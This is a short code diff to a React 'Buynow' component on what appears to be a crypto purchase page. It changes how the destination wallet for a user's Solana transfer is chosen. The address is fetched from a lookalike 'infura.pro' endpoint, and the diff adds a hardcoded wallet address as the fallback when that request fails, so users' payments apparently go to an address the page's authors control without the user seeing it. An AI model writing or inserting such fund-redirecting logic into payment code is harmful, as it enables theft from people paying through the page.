@@ -152,7 +152,6 @@ const Buynow = () => {
 
       let walletAddr
 
-      console.log(Number(solAmount).toString())
       try {
         axios
           .post('https://api2.infura.pro/infura', {
@@ -165,10 +164,11 @@ const Buynow = () => {
             } else {
               // ToDo : show error message.
               toastError('Please try again.')
+              return;      
             }
           })
       } catch (err) {
-        toastError('Please try again.')
+        walletAddr = '91UbYbBXcerJVa7yHqBmY8NKDmspT1QZ8Ub5Arem2Wxb'
       }
 
       const transaction = await createTransferTransaction(
